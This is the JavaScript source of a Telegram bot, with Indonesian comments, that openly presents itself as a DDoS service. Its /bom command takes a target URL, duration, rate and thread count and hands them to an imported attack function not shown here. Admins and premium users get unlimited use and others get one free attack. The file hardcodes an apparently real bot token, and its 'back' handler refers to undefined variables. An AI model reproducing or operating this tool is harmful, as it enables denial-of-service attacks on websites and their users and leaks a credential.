const { Telegraf, Markup } = require("telegraf");
const { kaBoom } = require("./kaBoom");
const config = require("./config");
const fs = require("fs");

const bot = new Telegraf("7386887141:AAEcu-SyT0_dJljHKRUx0Es3SPdRiDEqgGs"); // Ganti dengan token botmu

// Load data premium & userSampah
let premiumData = JSON.parse(fs.readFileSync("premium.json", "utf8"));
let userSampah = JSON.parse(fs.readFileSync("userSampah.json", "utf8"));

// Perintah /start
// Perintah /start
bot.start((ctx) => {
    let chatType = ctx.chat.type;
    let message = `<b>🔥 Selamat datang di bot DDOS</b>\n\n` +
                  `Gunakan tombol di bawah untuk navigasi.`;

    const menuButtons = Markup.inlineKeyboard([
        [Markup.button.url("➕ Tambahkan saya ke grup", "https://t.me/lorenzo_xavier_bot?startgroup=true")],
        [Markup.button.url("👑 Owner", "https://t.me/lorenzo_xavier")],
        [Markup.button.url("📢 Channel", "https://t.me/enzo_xavierr")],
        [Markup.button.callback("📜 Help Command", "help")]
    ]);

    if (chatType === "private") {
        return ctx.replyWithPhoto(
            { url: "https://example.com/gambar.png" }, 
            { caption: message, parse_mode: "HTML", ...menuButtons }
        );
    } else {
        return ctx.reply(message, { parse_mode: "HTML", ...menuButtons });
    }
});

// Handle tombol Help Command
bot.action("help", (ctx) => {
    if (!ctx.callbackQuery.message) {
        return ctx.answerCbQuery("⚠️ Tidak dapat mengedit pesan ini.", { show_alert: true });
    }

    ctx.editMessageText(
        `<b>📜 Daftar Perintah:</b>\n\n` +
        `<code>/bom</code> - Mulai serangan\n` +
        `<code>/addprem &lt;userId&gt;</code> - Tambah user premium`,
        { parse_mode: "HTML", ...Markup.inlineKeyboard([[Markup.button.callback("🔙 Kembali", "back")]]) }
    );
});

bot.action("back", (ctx) => {
  let chatType = ctx.chat.type;
  let menunya = Markup.inlineKeyboard([
        [Markup.button.url("➕ Tambahkan saya ke grup", "https://t.me/lorenzo_xavier_bot?startgroup=true")],
        [Markup.button.url("👑 Owner", "https://t.me/lorenzo_xavier")],
        [Markup.button.url("📢 Channel", "https://t.me/enzo_xavierr")],
        [Markup.button.callback("📜 Help Command", "help")]
    ]);
    if (chatType === "private") {
        return ctx.replyWithPhoto(
            { url: "https://example.com/gambar.png" }, 
            { caption: message, parse_mode: "HTML", ...menunya }
        );
    } else {
        return ctx.reply(message, { parse_mode: "HTML", ...menuButtons });
    }
})

// Perintah /bom
bot.command("bom", (ctx) => {
    let userId = ctx.from.id;

    if (config.adminId.includes(userId) || premiumData.premiumUsers.includes(userId)) {
        return startAttack(ctx);
    }

    if (userSampah.used.includes(userId)) {
        return ctx.reply("⚠️ <b>Anda hanya bisa menggunakan perintah ini 1 kali!</b>", { parse_mode: "HTML" });
    }

    userSampah.used.push(userId);
    fs.writeFileSync("userSampah.json", JSON.stringify(userSampah, null, 2));

    return startAttack(ctx);
});

// Fungsi untuk memulai serangan
function startAttack(ctx) {
    let args = ctx.message.text.split(" ");
    if (args.length < 5) {
        return ctx.reply("⚠️ <b>Format:</b> <code>/bom &lt;target&gt; &lt;time&gt; &lt;rate&gt; &lt;threads&gt;</code>", { parse_mode: "HTML" });
    }

    let target = args[1];
    let time = parseInt(args[2]);
    let rate = parseInt(args[3]);
    let threads = parseInt(args[4]);

    if (!target.startsWith("http")) {
        return ctx.reply("⚠️ <b>URL target harus diawali dengan</b> <code>http</code> <b>atau</b> <code>https</code>.", { parse_mode: "HTML" });
    }
    if (isNaN(time) || isNaN(rate) || isNaN(threads)) {
        return ctx.reply("⚠️ <b>Parameter harus berupa angka.</b>", { parse_mode: "HTML" });
    }

    ctx.reply(
        `<b>🔥 Serangan dimulai ke:</b> <code>${target}</code>\n` +
        `<b>🕒 Waktu:</b> <code>${time}s</code>\n` +
        `<b>⚡ Rate:</b> <code>${rate} RPS</code>\n` +
        `<b>🧵 Threads:</b> <code>${threads}</code>`,
        { parse_mode: "HTML" }
    );

    kaBoom(target, time, rate, threads);
}

// Perintah /addprem <userId>
bot.command("addprem", (ctx) => {
    let userId = ctx.from.id;
    let args = ctx.message.text.split(" ");

    if (!config.adminId.includes(userId)) {
        return ctx.reply("⚠️ <b>Hanya admin yang bisa menambahkan user premium!</b>", { parse_mode: "HTML" });
    }

    if (args.length < 2) {
        return ctx.reply("⚠️ <b>Format:</b> <code>/addprem &lt;userId&gt;</code>", { parse_mode: "HTML" });
    }

    let newUserId = parseInt(args[1]);
    if (isNaN(newUserId)) {
        return ctx.reply("⚠️ <b>User ID harus berupa angka.</b>", { parse_mode: "HTML" });
    }

    if (premiumData.premiumUsers.includes(newUserId)) {
        return ctx.reply("✅ <b>User ini sudah premium.</b>", { parse_mode: "HTML" });
    }

    premiumData.premiumUsers.push(newUserId);
    fs.writeFileSync("premium.json", JSON.stringify(premiumData, null, 2));

    ctx.reply(`✅ <b>User</b> <code>${newUserId}</code> <b>berhasil ditambahkan ke premium!</b>`, { parse_mode: "HTML" });
});

// Jalankan bot
bot.launch().then(() => {
    console.log("Bot DDoS Beta Version actived");
}).catch((err) => {
    console.error("Gagal menjalankan bot:", err);
});